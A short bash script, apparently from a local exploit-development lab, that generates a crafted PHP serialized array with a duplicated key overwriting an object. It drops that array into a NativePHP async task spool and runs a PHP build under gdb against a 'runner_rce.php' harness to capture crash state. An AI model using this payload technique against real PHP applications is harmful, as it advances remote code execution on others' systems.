#!/bin/bash
# Dump full gdb output for one staged calib run.
LAB=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab
PHP=/tmp/php8512_build/plain2/sapi/cli/php
SPOOL="$LAB/storage/framework/async/payload"
CALIB_ID=calib-0000-0000-0000-000000000000
BASE=${1:-1017}

python3 - "$BASE" <<'PYEOF' > /tmp/calib_payload.txt
import sys
base = int(sys.argv[1])
els = [f"i:{k};i:1;" for k in range(base)]
cls = "NativeAsyncCalib"
els.append(f'i:9998;O:{len(cls)}:"{cls}":1:{{s:4:"addr";s:1:"0";}}')
els.append("i:9998;i:5;")
sys.stdout.write(f"a:{base + 2}:{{" + "".join(els) + "}")
PYEOF
cp /tmp/calib_payload.txt "$SPOOL/$CALIB_ID.task"

timeout 60 env NATIVEPHP_TASK_ID=$CALIB_ID gdb -q -batch \
  -ex "set pagination off" -ex "set confirm off" -ex "set auto-load safe-path /" \
  -ex "run -n $LAB/runner_rce.php" \
  -ex 'bt 8' \
  -ex 'info registers rax rdi rsi' \
  "$PHP" 2>&1 | grep -v "^\[" | tail -30
